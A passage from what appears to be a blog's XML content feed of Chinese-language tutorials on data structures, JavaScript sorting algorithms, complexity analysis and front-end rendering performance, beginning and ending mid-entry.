        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构-数据结构的概念以及相关术语]]></title>
    <url>%2F2018%2F04%2F17%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%9C%AF%E8%AF%AD%2F</url>
    <content type="text"><![CDATA[数据结构以及相关术语的概念数据数据数据：所有被计算机存储、处理的对象都叫做数据。如：文字、语音、图像、视频 等等，数据的含义非常广泛。 数据元素数据 是由 数据元素 组成的，数据元素 是数据的基本单位。 数据项数据元素 是数据的基本单位，而数据项是数据的不可分割的最小标示单位，数据元素 由若干个 数据项组成 数据结构数据结构描述了一个 数据 中 数据元素 间的某种关系。它包括：数据的逻辑结构、数据的存储结构、数据的基本运算。 数据的逻辑结构数据的逻辑结构描述的是 数据元素 间的逻辑关系，比如一个数据中数据元素间可能没有任何关系，那么这种数据的数据逻辑结构叫 集合，如果数据元素间是一个接着一个排列的，那么这种数据的数据逻辑结构叫 线性结构，常见的数据逻辑结构有四大类： 集合 线性结构 树形结构 图结构 如下图所示： 数据的存储结构数据的逻辑结构在计算机中实现称为 数据的存储结构。 数据的存储结构由 数据元素 与 元素间的关系 组成，表示元素间的关系主要有两种方式：顺序存储 和 链式存储，如下图： 顺序存储：存储节点存放在一个连续的存储区域里。 链式存储：存储节点除了包含数据元素外，还包含一个指向其他存储节点的指针。 数据的基本运算数据的基本运算指的是：对数据的逻辑结构施加一系列操作。 比如栈有如下基本操作： push(element)【压入栈】 pop()【弹出栈】 peek()【预览栈顶】 clear()【清空栈】 length()【获取栈的元素个数】 队列有如下基本操作： enqueue(element)【入队】 dequeue()【出队】 peek()【读取队头的元素】 clear()【清空队列】 length()【获取队列的元素个数】 类似于着一些列的操作，我们成为数据的基本运算。 我们知道，栈和队列拥有相同的逻辑结构，即都是线性结构，但他们并不是相同的数据结构，因为他们拥有不同的基本运算。不要忘了数据结构所代表的是数据的逻辑结构、数据的存储结构以及数据的基本操作三者共同的作用：]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>概念</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-高级排序算法]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%AE%97%E6%B3%95_%E9%AB%98%E7%BA%A7%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[高级排序算法高级排序算法常用来处理大型的数据集合，这个数据集可达上百万个元素，而不是几百几千个。通过你需要排序的数据集合规模较小，建议使用基本排序算法处理，因为在小规模数据下使用高级排序算法，并不能起到优化的作用，有的时候甚至会由于算法本身的实现方式而拖慢速度，比如小规模数据使用快速排序算法性能反而不好。 希尔排序算法简介希尔排序名字的来自于它的发明者：Donald Shell。希尔排序是对插入排序的改编版本，它和插入排序的不同在于，希尔排序会先比较离得较近的元素，而非相邻的元素，这在处理大规模数据的时候，能够使得元素更快的回到它应该出现的位置。 算法的平均时间复杂度为 O(nlog n) 算法描述希尔排序的关键在于 间隔序列，这个间隔序列可以是事先指定好的，也可以是动态生成的。间隔序列的特点为，每个间隔序列的值依次递减且最后一个值必须为1，假设间隔序列为：[g1, g2, g3, g4, ...., gk]，那么有 1g1 &gt; g2 &gt; g3 &gt; g4 &gt; ... &gt; gk 且 1gk === 1 也可以动态生成间隔序列，动态生成间隔序列的算法是在《算法(第4版)》的合著者 Robert Sedgewick 提出的： 123456789// 计算后得到的 h 为间隔序列的最大值let len = arr.lengthlet h = 1while (h &lt; len / 3) &#123; h = h * 3 + 1&#125;// 然后每趟间隔序列排序完成后，将 h 的值递减，直到 h 等于 1 为止，根据上面的生成算法，递减算法为：h = (h - 1) / 3 有了间隔序列之后，对数组依次使用间隔序列的值进行排序，而非像插入排序那样每次都从有序序列的后面逐个向前扫描，这样做的好处是可以使元素更快的出现在它应该在的“范围之内”，这个范围会随着间隔序列的值逐渐减小，直到当间隔序列值为 1 的时候，便会逐个比较，不过此时由于元素已经出现在离正确位置很近的位置，所以排序进行的会很快。 代码实现12345678910111213141516171819202122function shellSort (arr) &#123; var len = arr.length var g = 1 // 动态计算间隔序列 while (g &lt; len / 3) &#123; g = g * 3 + 1 &#125; // 最后一趟比较的间隔应该为 1 while (g &gt;= 1) &#123; // 开始一趟以 g 为间隔的比较，初始化 i = g，且 i 逐渐累加到数组的最后一个元素 for (var i = g; i &lt; len; i++) &#123; // j 的初始化值为 i，j每次循环都会减少g，意味着：从第 i 个元素开始向前与相隔g个单位的元素进行比较。 for (var j = i; j &gt;= g &amp;&amp; arr[j - g] &gt; arr[j]; j -= g) &#123; var temp = arr[j - g] arr[j - g] = arr[j] arr[j] = temp &#125; &#125; // 更新间隔值 g = (g - 1) / 3 &#125;&#125; 归并排序算法简介归并排序的实现方式有两种，一种是自顶向下，另一种是子底向上。 归并排序是分治法的典型应用，他的名字来自与其排序的方式。 算法的平均时间复杂度为 O(nlog n)，空间复杂度为 O(n) 算法描述自顶向下首先将长度为 n 的数组分成两个长度为 n/2 的子数组，然后将两个子数组递归的执行一分为二的操作，直到每个子数组中至多包含一个元素为止。由于这是一个递归的过程，当程序回溯的时候，将两个子数组进行排序合并，直到回溯完毕，此时排序完成，如下图： 上图描述了一个数组被递归拆分的过程，除此之外，在程序回溯的时候，一次保证数组有序，如下图： 自顶向下的代码实现代码来自：https://github.com/damonare/Sorts，并做了适当的修改和注释： 1234567891011121314151617181920212223242526272829303132333435363738// 调用的主要方法function mergeSort (arr) &#123; let len = arr.length // 递归结束的条件 if(len &lt; 2) &#123; return arr &#125; // 对数组进行拆分，拆为 left 和 right let middle = Math.floor(len / 2), left = arr.slice(0, middle), right = arr.slice(middle) // 递归调用，采用尾递归优化 return merge(mergeSort(left), mergeSort(right))&#125;// merge方法用来对两个数组进行排序，并返回排好序的数组function merge (left, right) &#123; var result = [] // 对两个子数组进行排序 while (left.length &amp;&amp; right.length) &#123; if (left[0] &lt;= right[0]) &#123; result.push(left.shift()) &#125; else &#123; result.push(right.shift()) &#125; &#125; // 由于两个子数组的元素个数不一定相等，所以在上一个while循环排序完成后， // 要检查left和right中是否还有元素，如果有则推入结果数组中 while (left.length) &#123; result.push(left.shift()) &#125; while (right.length) &#123; result.push(right.shift()) &#125; return result&#125; 快速排序快速排序由于排序效率在同为O(N*logN)的几种排序方法中效率较高，因此经常被采用，再加上快速排序思想—-分治法也确实实用。快速排序是一种既不浪费空间又可以快一点的排序算法。 算法步骤 先从数列中取出一个数作为“基准”。 分区过程：将比这个“基准”大的数全放到“基准”的右边，小于或等于“基准”的数全放到“基准”的左边。 再对左右区间重复第二步，直到各区间只有一个数。 算法实现123456789101112131415var quickSort = function(arr) &#123; if (arr.length &lt;= 1) &#123; return arr; &#125; var pivotIndex = Math.floor(arr.length / 2); //基准位置（理论上可任意选取） var pivot = arr.splice(pivotIndex, 1)[0]; //基准数 var left = []; var right = []; for (var i = 0; i &lt; arr.length; i++)&#123; if (arr[i] &lt; pivot) &#123; left.push(arr[i]); &#125; else &#123; right.push(arr[i]); &#125; &#125; return quickSort(left).concat([pivot], quickSort(right)); //链接左数组、基准数构成的数组、右数组&#125;;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>高级排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-基础排序算法]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%AE%97%E6%B3%95_%E5%9F%BA%E7%A1%80%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[基本排序算法冒泡排序算法简介冒泡排序属于基本排序算法之一，基本排序算法的一个特点是：需要两层嵌套的循环。外层循环用于遍历数组的每一项，内层循环用于对元素进行比较。 算法的时间复杂度为 O(n²) 算法描述冒泡这个名字来自于该算法的排序过程，即数据会像气泡一样从数组的一端浮动到另外一端。 以升序为例，算法的过程为： 1、使用数组的第一个元素和数组的第二个元素作比较，如果第一个元素大于第二个元素，就叫唤它们的位置。 2、再使用数组的第二个元素和数组的第三个元素作比较，比较方式同步骤一 3、如步骤一和步骤二的方式，当第一轮比较结束之后，能够保证数组最右端的项为最大值 4、进入下一轮比较，此时由于已知数组的最后一项为最大值，所以比较的次数可以减少一次 5、重复步骤4直到排序完成 一图胜千言（图片来自：https://github.com/damonare/Sorts)： 代码实现1234567891011121314function bubbleSort (arr) &#123; var num = arr.length for (var i = 0; i &lt; num - 1; i++) &#123; // 这里的 num - 1 - i 中的 i 很关键，保证了每轮的比较次数减一 for (var j = 0; j &lt; num - 1 - i; j++) &#123; if (arr[j] &gt; arr[j + 1]) &#123; // 交换元素 var temp = arr[j] arr[j] = arr[j + 1] arr[j + 1] = temp &#125; &#125; &#125;&#125; 优化冒泡排序假设我们有如下数组： 1var arr = [2, 1, 3, 4, 5, 6, 7, 8, 9] 对于该数组的排序，其实我们只需要将数组的第一个元素 2 与数组的第二个元素 1 交换一下位置即可，因为后边的数据已经是有序的了。 但是我们上面的冒泡排序算法，在对该数组进行排序时第一轮排序依然会对比到数组的最后一个元素，第二个排序会对比到数组的倒数第二个元素。这个时候，我们是有一些优化手段的，其中一个解决办法就是设置一个标志，该标志存储了最后一次数据位置交换的索引。大家可以想象一下 最后一次位置交换 以为着什么？它意味着该位置后边的元素已经是有序的了。所以下一轮比较只需要比较到该位置即可。 优化后的代码如下： 1234567891011121314151617181920function bubbleKeySort (arr) &#123; // pos为最后一次交换数据位置的标志，初始化为数组最后一个元素 var pos = arr.length - 1 // 只要 pos 大于0，就开启新一轮的比较 while (pos &gt; 0) &#123; // 变量 p 用来存储本轮比较最后一次交换数据的位置，初始化为 0，这个很关键，因为当本轮比较结束之后如果 p 仍然为 0，那么就不会再执行 while 循环，此时数据已经排好序 var p = 0 for (var j = 0; j &lt; pos; j++) &#123; if (arr[j] &gt; arr[j + 1]) &#123; // 更新 p 的值 p = j var temp = arr[j] arr[j] = arr[j + 1] arr[j + 1] = temp &#125; &#125; // 本轮比较结束之后，更新 pos 的值 pos = p &#125;&#125; 选择排序算法简介选择排序和冒泡排序一样，同属于基本排序算法。 算法的时间复杂度为 O(n²) 算法描述选择排序的关键在于 选择 二字，拿数组的第一个元素和数组其他元素作比较，然后找到数组中最小(大)的元素，将最小的元素 选择 出来，放到数组的第一个位置，然后再拿数组的第二个元素和其他元素其他元素作比较，重复之前的比较步骤。这样由于每次都选择最小(大)的元素，将这些元素一次摆放就可以将数组排好序。 一图胜千言（图片来自：https://github.com/damonare/Sorts)： 代码实现以升序为例： 123456789101112131415161718function selectionSort (arr) &#123; // 从数组的 第一个 元素遍历到数组的 倒数第二个 元素 for (var i = 0; i &lt; arr.length - 1; i++) &#123; // min为最小值的索引，被初始化为i，即假设每轮比较的首个元素就是最小的 var min = i // 从数组的 i + 1 个元素遍历到数组的 最后一个 元素 for (var j = i + 1; j &lt; arr.length; j++) &#123; // 与预期的最小值进行比较，如果比预期的最小值还小，就更新最小值 if (arr[j] &lt; arr[min]) &#123; min = j &#125; &#125; // 第二层循环结束时，min索引指向的元素即为最小的元素，交换位置开始下一轮比较 var temp = arr[i] arr[i] = arr[min] arr[min] = temp &#125;&#125; 插入排序算法简介插入排序也属于基本排序算法。 算法的时间复杂度为 O(n²) 算法描述插入排序的思路是构建有序序列，取出数组的第一个元素，认为其实有序的，然后再取出数组的第二个元素与有序序列中的元素进行比较，然后插入合适的位置，知道数组中的所有元素都被 取出-比较-插入-完成。 一图胜千言（图片来自：https://github.com/damonare/Sorts)： 代码实现以升序为例： 123456789101112131415function insertionSort (arr) &#123; // 从数组第二项开始遍历，即默认第一项为有序的 for (var i = 1; i &lt; arr.length; i++) &#123; // j代表数有序序列的最后一项 var j = i - 1 var temp = arr[i] // 从有序序列最后一项向前扫描，与 temp 对比，如果比temp大，则后移一位 while (j &gt;= 0 &amp;&amp; arr[j] &gt; temp) &#123; arr[j + 1] = arr[j] j-- &#125; // 退出循环后，arr[j]的元素是小于等于temp的，所以将temp插入到 j+1 的位置 arr[j + 1] = temp &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>基础排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-算法的时间复杂度和空间复杂度]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%AE%97%E6%B3%95_%E7%AE%97%E6%B3%95%E7%9A%84%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%92%8C%E7%A9%BA%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%2F</url>
    <content type="text"><![CDATA[算法的时间复杂度和空间复杂度 算法的评估对于一个问题，经常有多种不同的求解算法，这时候我们就需要一个对算法进行评估的标准，找出最优的方案，评估一个算法有以下几个维度： 正确性：能正确的实现功能，满足问题的需求。 易读性：通常，写出一个利与人类阅读的代码和利于机器阅读的代码一样重要 健壮性：对于预料之外的输入，也能做出合适的处理。 时空性：算法的时间性能(算法的计算量)和空间性能(算法需要的存储量)、 时间复杂度时间复杂度的计算方法时间复杂度：在给定输入(问题规模)下，算法的计算量。 所以说，求一个算法的时间复杂度，就是求这个算法在给定问题规模下的计算量，那么问题来了：如何求算法的计算量？ 算法计算量的求法规则如下： 1、在算法中选择几种“基本操作”，例如：赋值语句、数学运算语句等等。 2、给定输入下，计算算法执行了多少次“基本操作”。 3、“基本操作”的次数即可作为计算量。 实例与大O表示法我们以一个例子来说明，求如下表达式的值： 12// 阶乘的和1! + 2! + 3! + ... + n! 我们可以写出如下程序(js代码)： 123456789101112function factorial (n) &#123; var s = 0, temp = 1 for (var i = 1; i &lt;= n; i++) &#123; temp = 1 for (var j = 1; j &lt;= i; j++) &#123; temp *= j &#125; s += temp &#125; return s&#125; 我们根据之前总结的算法计算量的求法规则可知，求解一个算法的计算量分为三个步骤，第一步：确定基本操作，对于上面的代码我们所挑选的基本操作如下： 第一部分赋值语句：12var s = 0 temp = 1 当我们的输入规模即 n 变化时，这两条语句的执行次数没有变，始终是 2 次。 第二部分赋值语句：1234for (var i = 1; i &lt;= n; i++) &#123; temp = 1 ...&#125; 第一层循环里的 temp = 1，该语句的执行次数等于输入规模 n。 乘法计算语句：123for (var j = 1; j &lt;= i; j++) &#123; temp *= j&#125; 第二层循环里的 temp *= j，该语句的执行次数，当 n = 1 时执行 1 次，当 n = 2 时执行 1 + 2 次，当 n = 3 时执行 1 + 2 + 3 次，所以该语句的执行次数与输入规模 n 的关系是 1 + 2 + 3 + ... + n = n(n + 1) / 2。 加法计算语句：1234for (var i = 1; i &lt;= n; i++) &#123; ... s += temp&#125; 第一层循环里的加法赋值语句，该语句的执行次数等于输入规模 n。 综上所述，根据我们选择的“基本操作”，可以计算出该算法的基本操作次数与输入规模 n 的关系如下： 1T(n) = 2 + n + n(n + 1) / 2 + n = 1/2n^2 + 3/2n + 2 当 n 足够大时，n^2 起支配作用，使用 O(n^2) 表示 T(n) 的近似值，这种表示法成为 大 O 表示法。 常见的时间复杂度阶数 常熟阶 O(1)：即算法的计算量不随着输入规模的变化而变化。 线性阶 O(n) 多项式阶 O(n^c)：常见的多项式阶如 O(n^2)、O(n^3) 指数阶 O(C^n)：常见的指数阶如 O(2^n) 一般我们认为一个算法的时间复杂度为指数阶的时候，该算法是实际不可运算的，大家可以想象一下，如果一个算法的时间复杂度为 O(2^n) 当 n = 1000 时，这个数值是何等恐怖。更何况我们的输入规模 n 很可能远大于 1000。 另外我们认为时间复杂度为 O(n)、O(log2N)、O(n^2) 是高效的算法。对于合理大的 n，O(n^3) 也是可以接受的。 空间复杂度空间复杂度的计算方法空间复杂度：给定输入(问题规模)下，算法运行时所占用的临时存储空间。 一个算法执行期间所占用的存储量分为三部分： 算法本身的代码所占用的空间 输入数据所占用的空间 辅助变量所占用的空间 由于实现不同算法所需的代码不会有数量级的差别，所以算法本身代码所占用的空间我们可以不考虑 输入的数据所占用的空间是由问题决定的，与算法无关，所以我们也不需要考虑 我们需要考虑的只有一个：程序执行期间，辅助变量所占用的空间。 计算方法类似于计算算法的时间复杂度，空间复杂度我们用 S(n) 来表示，它同样是输入数据规模 n 的函数，用大 O 表示法记为： 1S(n) = O(g(n)) 其中 g(n) 是一个关于 n 的函数，如：g(n) = n、g(n) = n^2、g(n) = log2N 等等。 实例假设我们有一个数组，该数组有100个元素，写一个转置该数组的算法： 1234567function reverse (arr) &#123; for (var i = 0; i &lt;= arr.length / 2 - 1; i++) &#123; var temp = arr[i] arr[i] = arr[arr.length - i - 1] arr[arr.length - i - 1] = temp &#125;&#125; 上面的算法中，我们采用中间变量 temp 对数组的值进行逐个对应的首尾交换，最终达到转置的目的，我们可以看到，辅助变量只有一个即 temp，该变量存储一个数字类型的值，temp 所占用的内存不会随输入数组规模的增大而增大，所以上面算法的控件复杂度为 O(1)，是常数阶，即上面算法的空间复杂度 S(n) = O(1)。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>复杂度概念</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数节流]]></title>
    <url>%2F2018%2F04%2F17%2FCode_%E5%87%BD%E6%95%B0%E8%8A%82%E6%B5%81%2F</url>
    <content type="text"></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>实例代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让程序睡眠3秒]]></title>
    <url>%2F2018%2F04%2F17%2FCode_%E8%AE%A9%E7%A8%8B%E5%BA%8F%E7%9D%A1%E7%9C%A03%E7%A7%92%2F</url>
    <content type="text"></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>实例代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个监听数据变化的例子【含数组】]]></title>
    <url>%2F2018%2F04%2F17%2FCode_%E4%B8%80%E4%B8%AA%E7%9B%91%E5%90%AC%E6%95%B0%E6%8D%AE%E5%8F%98%E5%8C%96%E7%9A%84%E4%BE%8B%E5%AD%90%E3%80%90%E5%90%AB%E6%95%B0%E7%BB%84%E3%80%91%2F</url>
    <content type="text"></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>MVVM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度克隆]]></title>
    <url>%2F2018%2F04%2F17%2FCode_%E6%B7%B1%E5%BA%A6%E5%85%8B%E9%9A%86%2F</url>
    <content type="text"></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>实例代码</tag>
        <tag>深度克隆</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[性能-数据直出与服务端渲染的首屏优化]]></title>
    <url>%2F2018%2F04%2F17%2F%E6%80%A7%E8%83%BD_%E6%95%B0%E6%8D%AE%E7%9B%B4%E5%87%BA%E4%B8%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B8%B2%E6%9F%93%E7%9A%84%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[数据直出与服务端渲染的首屏优化在web开发初期，对于前端来讲，存在感是很小的，基本上是服务端给什么，前端就展示什么，这个时候一般以服务端MVC开发模式为主。前端浏览器单纯的展示由服务端吐出的数据。 随着技术的发展，ajax的出现改变了这一现状，使得SPA(单页应用)受到了极大的推崇，其实究其原因，就是因为ajax带来的用户感知友好。说白了就是能不刷新页面的就不要刷新。这个时候，逐渐形成了一套前后端分离的方案或开发模式，这套开发模式也使得前端和后端开发的解耦，一定程度上提升了开发效率。 而最近，似乎服务端渲染又被推崇了起来。其实无论是前后端分离也好，服务端渲染也罢，我们最终的目的只有一个：让应用的性能更佳，让用户的体验更好。 这篇文章就从应用的加载已经渲染的过程，谈谈服务端渲染对应用的优化。 纯前后端分离的做法用一张图来表示纯前后端分离的做法： 基本分成五个步骤，解释如下： 一：首先浏览器要向从服务器获取html页面，然后浏览器开始解析页面。 二：通常在解析页面的时候，在html标签的头部会遇到 &lt;link&gt; 的CSS资源，这个时候可能会向CDN加载CSS资源。 三：遇到页面底部的js资源，同样要加载js资源。 四：要等到js资源加载完成后，才能够通过ajax请求服务端的接口，获取数据。 五：当取到数据之后，渲染页面。 首先，我们分析一下这个过程，至少要发送四次http请求才能开始渲染页面： 第一次：请求 html 页面 第二次：请求 css 资源（假设只有一个css资源需要加载） 第三次：请求 js 资源（假设只有一个js资源需要加载） 第四次：请求数据 除了需要四次http请求之外，我们应该注意另外一件事，就是渲染页面的时机，是在第五步才开始进行的。那么这个过程有什么办法优化吗？答案是有的。 数据直出在之前的那张图片中，我们可以清晰的看到，第一步请求 html 文件，第四步才能够请求数据，那么我们可不可以把第四步合并至第一步呢？换句话说，我们服务器在返回html内容的同时，把数据也一并返回，拼接到 html 字符串上，比如插入到 body 标签的自定义属性上，比如： 1&lt;body data-render-data="&#123;boj:&#123;a: 1&#125;&#125;"&gt;&lt;/body&gt; 这样，我们在第四步判断如果服务器已经把数据给我们返回了，就不需要再请求数据了，即减少了一次 http 请求的开销，用一张图表示这个过程： 那么这样做的收益如何？其实等价于把外网发送的http数据请求该为了服务器内网对数据的请求，外网的网络环境相当不可控，甚至极其恶劣，但我们内网的速度极快且稳定。 服务端渲染在上一小节数据直出中我们知道，服务端可以把html字符串和数据一并给我们返回，那么可不可以再进一步：服务端将html和数据进行渲染，将渲染好之后的html字符串吐给前端，直接展示，来看下面这张图： 这样做和简单的数据直出有什么好处？答案是更快的展示首屏的内容给用户，原因如下： 简单的数据直出，要等到CSS和JS资源都加载完之后，才进行渲染展示。而ssr在第一步就以及渲染完成，只要CSS资源加载完就可以按照预定的样式展示了。这无疑会对展示的速度提升很多，甚至，如果CSS资源不大的话，我们可以考虑将CSS通过 style 标签内敛到html里，这样又减少了请求CSS资源的时间。 当然，这样考虑整体资源的大小，一般情况下，首屏加载的资源要小于1000kb。所以根据资源情况来决定采用什么样的措施。 目前，React 和 Vue 等主流的前端框架都已经支持服务端渲染（ssr），如果应用得当的话，是可以有效对首屏加载时间进行一定程度的优化的。]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>首屏优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[性能-重排和重绘的概念及触发条件]]></title>
    <url>%2F2018%2F04%2F17%2F%E6%80%A7%E8%83%BD_%E9%87%8D%E6%8E%92%E5%92%8C%E9%87%8D%E7%BB%98%E7%9A%84%E6%A6%82%E5%BF%B5%E5%8F%8A%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[重排和重绘重排(reflow)重新构造渲染树(Render Tree)的过程，叫做重排 当DOM元素的变化影响了几何属性（如：宽高、位置）时，浏览器需要重新计算元素的几何属性，同时其他元素的几何属性也可能受到影响，这个时候浏览器会使渲染树(Render Tree)中受影响的部分失效，并重新构造渲染树，这个过程叫重排。 浏览器在构造渲染树的时候，通常只需要遍历一次 重排的触发时机 添加、删除、替换DOM节点 改变DOM元素的位置、尺寸、内容 浏览器窗口大小发生改变 页面初次渲染 重绘(repaint)浏览器绘制变化的部分到屏幕叫重绘 元素的变化不一定触发重排，但一定触发重绘 渲染树变化队列和刷新浏览器有自己的优化机制，即并不是每次变化都会触发重排，而是将变化缓冲在队列里，当变化达到一定数量后刷新变化队列，触发重排。但是我们在获取一下属性时，浏览器会强制更新变化队列触发重排，因为这些属性需要返回实时的值： offsetTop、offsetLeft、offsetWidth、offsetHeight scrollTop、scrollLeft、scrollWidth、scrollHeight clientTop、clientLeft、clientWidth、clientHeight getComputeStyle()、currentStyle(IE) 性能优化（最小化重排和重绘）在修改元素多种样式属性时，使用替换class名的方式 代替 使用js脚本逐个修改样式]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>重排重绘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[性能-浏览器渲染页面的过程]]></title>
    <url>%2F2018%2F04%2F17%2F%E6%80%A7%E8%83%BD_%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E9%A1%B5%E9%9D%A2%E7%9A%84%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[浏览器渲染页面的过程浏览器渲染页面的过程如下图： 一、解析HTML创建DOM Tree浏览器解析HTML文档，并构造一颗DOM树(DOM Tree) 二、解析CSS计算样式数据浏览器构造DOM树的同时，还会解析CSS样式并计算最终的样式数据，生成样式规则。 三、构造渲染树(Render Tree)根据 DOM Tree 和 样式数据构造一颗渲染树(Render Tree) 渲染树会忽略不需要渲染的DOM元素（如：head标签、display值为none的元素） 四、layout布局当渲染树构造完成后，浏览器会对渲染树进行布局，即分配固定的坐标点给DOM元素。 五、paint绘制布局完成后，浏览器将绘制最终的界面给用户]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>浏览器渲染过程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[性能-H5性能优化整理]]></title>
    <url>%2F2018%2F04%2F17%2F%E6%80%A7%E8%83%BD_H5%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[H5 性能优化整理H5 性能指标我认为 H5 的性能指标包含三个维度： 完成首屏渲染的时间 渲染完成后用户的交互体验 应用的耗电情况 针对第一点：完成首屏渲染的时间，一个好的网站，应该在 2-4 秒内完成渲染，即展示给用户。我们可以设立一个目标，比如3秒内完成首屏渲染。 针对第二点：渲染完成后用户的交互体验，H5 站点经常会有纯H5的交互组件，如模拟滚动、模拟Picker选择器等。这些组件的体验是否流畅，是否会出现卡顿等问题，也是严重影响用户体验的因素，需要我们考虑。 针对第三点：应用的耗电量，正如第二点所说，为了尽可能的避免卡顿，通常我们会启用3D硬件加速，但大面积的启用3D硬件加速会导致耗电量过大的问题，我们需要一个衡量变通的方案。 综上所述，我们要结合每一个性能指标，以及H5应用的实际场景，给出合理的优化方案，下面我们一个一个来谈。 最小化完成首屏渲染的时间要缩短完成首屏渲染的时间，那我们必然需要知道一个问题，哪些因素会影响完成渲染的时间，首先网速是一个必不可少的关键因素，网速快资源下载的快，那么最终完成渲染的时间必然要短，反之亦然。除了网速，资源的大小也是一个重要考量因素，如果网速是固定的，那么当然资源越小越好。除此之外，浏览器解析代码渲染页面的过程也是需要时间的，我们要尽可能的优化我们的代码，如尽可能避免引起浏览器的 Reflow/Repaint 等。为此我推荐大家从以下一个关键因素优化： 减小资源体积在弱网情况下如 2G/3G 网络，根据 chrome 浏览器开发者工具的 Network 中的限流控制，我们可以做出相应的衡量，如图： 2G弱网的平均网速约为 300kb/s，3弱网的最差网速为 250kb/s，兼顾 2G/3G，我们可以去 250kb/s 为标准，那么想要在 3s 内完成渲染，资源的体积一定要小于 250kb/s * 3s = 750kb。 压缩HTML、CSS、JavaScript，目前构建工具可以帮我们解决这个问题 压缩图片，(webP格式的图片要比同等质量的jpg图片小很多) 减少HTTP请求的数量手机浏览器能同时响应请求的数量为 4-6 个（Android4个，IOS5后支持6个），首次加载的资源数量要在 4 个以内。 合并JS、CSS资源 使用雪碧图 缓存静态资源这个可能是对站点优化最为显著的优化措施了。具体的缓存方法和原理，可以查看： 强缓存与协商缓存 关键路径优化可以查看：数据直出与服务端渲染的首屏优化 按需加载如果页面的内容过多，我们是可以考虑只加载首屏的内容，其他内容等用户真正需要的时候再加载，比如滚动加载、懒加载等等。 避免重定向重定向严重影响资源的加载速度，一定要避免。 渲染完成后用户的交互体验待续…… 应用的耗电情况待续……]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>H5性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[性能-基础性能知识]]></title>
    <url>%2F2018%2F04%2F17%2F%E6%80%A7%E8%83%BD_%E5%9F%BA%E7%A1%80%E6%80%A7%E8%83%BD%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[尽量少用 innerHTML 原因：因为 innerHTML 会调用一个沉重且高消耗的HTML解析器。 缓存DOM操作 NodeList 或 HTMLCollection 由于这两个集合的实时性原因，每次访问此集合都会重新查询文档。这将导致性能问题，应该做缓存处理 JavaScript默认是同步解析的 当DOM在解析时遇到 &lt;script&gt; 标签，将停止解析文档，并执行JavaScript脚本，如果是外部脚本，必须要下载后再解析，这将导致性能问题。 处理JavaScript事件时的性能问题 过多的绑定事件处理函数，每个函数都是对象，都会占用内存 在绑定事件的时候务必要访问DOM元素，如果访问的过多，这也将导致性能问题 内存中留有废掉的事件处理函数： 使用 removeChild() 或 replaceChild() 函数移除或替换节点时，如果被移除或替换的节点有绑定事件函数，那么该函数不会被当做垃圾回收。另外使用 innerHTML 替换DOM时也会出现这种情况 使用事件委托解决以上问题：减少DOM元素与事件函数的链接数，减少DOM访问次数，减少事件函数数量以减少内存占用。 最小化重排和重绘改变元素多种样式的时候，最好用className，一次性完成操作，这样只会修改一次DOM。 重排和重绘的概念及触发条件查看这里 FOUC (无样式内容闪烁)该问题主要出现在 IE 浏览器，原因有两个： 1、使用@import方法导入CSS 123&lt;style&gt; @import "../reset.css";&lt;/style&gt; IE 加载HTML文档后，会先解析文档，然后再去加载由 import 导入的外部CSS文件，在CSS没有被加载的这段时间内，页面是无样式的。 2、零散的添加样式引用 将样式表链接放在页面不同位置时，在IE5/6下某些页面会无样式显示内容且瞬间闪烁，这现象就是文档样式短暂失效（Flash Of Unstyled Content），即FOUC。 解决方案： 避免使用 @import 引入外部样式 将样式表引入放在 &lt;head&gt; 